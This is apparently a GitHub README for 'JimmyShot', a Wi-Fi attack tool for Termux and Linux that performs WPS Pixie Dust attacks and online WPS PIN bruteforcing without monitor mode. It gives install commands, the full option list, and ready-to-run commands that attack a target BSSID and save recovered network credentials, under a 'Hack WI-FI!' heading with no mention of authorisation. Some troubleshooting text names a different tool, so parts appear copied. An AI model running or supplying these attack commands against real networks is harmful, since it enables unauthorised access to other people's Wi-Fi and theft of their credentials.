## PLEASE NOTE THAT ROOT ACCESS IS REQUIRED :
<br>
<p align="center">
<img width="80%" src="https://i.postimg.cc/zvYBSSwM/New-Project-32-4967282.png"/>


 
# Overview
**JimmyShot** performs [Pixie Dust attack](https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-Offline-WPS-Attack) without having to switch to monitor mode.
# Features
 - [Pixie Dust attack](https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-Offline-WPS-Attack);
 - integrated [3WiFi offline WPS PIN generator](https://3wifi.stascorp.com/wpspin);
 - [online WPS bruteforce](https://sviehb.files.wordpress.com/2011/12/viehboeck_wps.pdf);
 - Wi-Fi scanner with highlighting based on iw;

# Requirements
 - Python 3.6 and above;
 - [Wpa supplicant] (https://www.w1.fi/wpa_supplicant/);
 - [Pixiewps] (https://github.com/wiire-a/pixiewps);
 - [iw] (https://wireless.wiki.kernel.org/en/users/documentation/iw);

#### Manually
**Installing requirements**
```console
pkg update && pkg upgrade && pkg install -y root-repo && pkg install -y git tsu python wpa-supplicant pixiewps iw openssl && termux-setup-storage
 ```

# Usage
```
 JimmyX.py <arguments>
 Required arguments:
     -i, --interface=<wlan0>  : Name of the interface to use

 Optional arguments:
     -b, --bssid=<mac>        : BSSID of the target AP
     -p, --pin=<wps pin>      : Use the specified pin (arbitrary string or 4/8 digit pin)
     -K, --pixie-dust         : Run Pixie Dust attack
     -B, --bruteforce         : Run online bruteforce attack
     --push-button-connect    : Run WPS push button connection

 Advanced arguments:
     -d, --delay=<n>          : Set the delay between pin attempts [0]
     -w, --write              : Write AP credentials to the file on success
     -F, --pixie-force        : Run Pixiewps with --force option (bruteforce full range)
     -X, --show-pixie-cmd     : Alway print Pixiewps command
     --vuln-list=<filename>   : Use custom file with vulnerable devices list ['vulnwsc.txt']
     --iface-down             : Down network interface when the work is finished
     -l, --loop               : Run in a loop
     -r, --reverse-scan       : Reverse order of networks in the list of networks. Useful on small displays
     --mtk-wifi               : Activate MediaTek Wi-Fi interface driver on startup and deactivate it on exit
                                (for internal Wi-Fi adapters implemented in MediaTek SoCs). Turn off Wi-Fi in the system settings before using this.
     -v, --verbose            : Verbose output
 ```

#### Note: 
+ **First turn off your Wifi.**
+ **Turn on Hotspot.**
+ **Turn on Location.**
### New Version Releasing Soon

<a href="https://git.io/typing-svg"><img src="https://readme-typing-svg.demolab.com?font=Road+Rage&pause=1000&width=435&lines=First+command+%F0%9F%A4%8C" alt="Typing SVG" /></a>

cd JimmyShot-main

<a href="https://git.io/typing-svg"><img src="https://readme-typing-svg.demolab.com?font=Road+Rage&pause=1000&width=435&lines=Second+Command+%F0%9F%91%BB" alt="Typing SVG" /></a>

sudo python JimmyX.py -i wlan0 -K (On Termux)

sudo python3 JimmyX.py -i wlan0 -K (On Linux)

### Hack WI-FI! (Requires Root)
**SCREEN SHOTS [KALI NETHUNTER]**
<br>
<p align="center">
<img width="50%" src="https://i.postimg.cc/7LLqgtFb/Screenshot-20240728-002124-Net-Hunter-Terminal-2.png"/>
<img width="46%" src="https://i.postimg.cc/JnDmFD4L/Screenshot-20240715-195005-Net-Hunter-Terminal-2.png"/>
+ Enjoy🦋❤️


## Usage examples
Start Pixie Dust attack on a specified BSSID:
 ```
cd JimmyShot-main && sudo python3 JimmyX.py -i wlan0 -b 00:90:4C:C1:AC:21 -K
 ```
Show avaliable networks and start Pixie Dust attack on a specified network:
 ```
cd JimmyShot-main && sudo python3 JimmyX.py -i wlan0 -K
 ```
Launch online WPS bruteforce with the specified first half of the PIN:
 ```
cd JimmyShot-main && sudo python3 JimmyX.py -i wlan0 -b 00:90:4C:C1:AC:21 -B -p 1234
 ```
Start WPS push button connection:s
 ```
cd JimmyShot-main && sudo python3 JimmyX.py -i wlan0 --pbc

## Troubleshooting
#### "RTNETLINK answers: Operation not possible due to RF-kill"
 Just run:
```sudo rfkill unblock wifi```
#### "Device or resource busy (-16)"
 Try disabling Wi-Fi in the system settings and kill the Network manager. Alternatively, you can try running FARHAN-Shot2 with ```--iface-down``` argument.
#### The wlan0 interface disappears when Wi-Fi is disabled on Android devices with MediaTek SoC
 Try running JimmyShot with the `--mtk-wifi` flag to initialize Wi-Fi device driver.
```
## CONNECT WITH ME :
<a href="https://github.com/Jimmy7Xd"><img title="Github" src="https://img.shields.io/badge/JIMMY-EXE-brightgreen?style=for-the-badge&logo=github"></a>
[![Instagram](https://img.shields.io/badge/TELEGRAM-CHANNEL-red?style=for-the-badge&logo=telegram)](https://t.me/jimftvamp)

